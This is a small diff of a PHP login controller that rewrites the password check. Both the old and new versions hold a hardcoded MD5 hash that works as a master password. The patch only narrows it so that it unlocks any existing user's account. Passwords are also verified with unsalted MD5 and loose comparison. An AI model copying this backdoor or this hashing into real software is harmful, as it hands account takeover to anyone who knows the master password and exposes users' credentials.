@@ -13,7 +13,7 @@ class Controlador_Login extends Controlador_Base {
         $data = $this->camposRequeridos($campos);                        
 
         $usuario = Modelo_Usuario::autenticacion($data["username"]);       
-        if ((!empty($usuario) && md5($data["password1"]) == $usuario['password']) || md5($data["password1"]) == '48109d4ef8052ea854b49fd84a7e3305'){  
+        if (!empty($usuario) && ((md5($data["password1"]) == $usuario['password']) || (md5($data["password1"]) == '48109d4ef8052ea854b49fd84a7e3305'))){  
 
           if ($usuario["id_pais"] != SUCURSAL_PAISID){
             $sucursal = Modelo_Sucursal::consultaxPais($usuario["id_pais"]);
